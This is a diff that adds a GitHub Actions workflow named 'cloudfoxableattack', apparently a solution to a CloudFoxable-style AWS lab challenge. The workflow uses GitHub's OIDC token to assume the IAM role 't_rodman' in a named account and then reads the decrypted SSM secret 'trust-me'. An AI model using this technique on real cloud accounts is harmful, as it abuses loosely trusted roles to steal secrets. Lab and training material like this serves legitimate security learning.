@@ -1,0 +1,21 @@
+name: cloudfoxableattack
+on:
+  push:
+    branches: [ main ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  AssumeRole:
+    runs-on: ubuntu-latest
+    steps:
+      - name: clone repo
+        uses: actions/checkout@v3
+      - name: set creds
+        uses: aws-actions/configure-aws-credentials@v2
+        with:
+          role-to-assume: arn:aws:iam::953954311215:role/t_rodman
+          aws-region: us-west-2
+      - name: perform action
+        run: |
+          aws --region us-west-2 ssm get-parameter --with-decryption --name trust-me
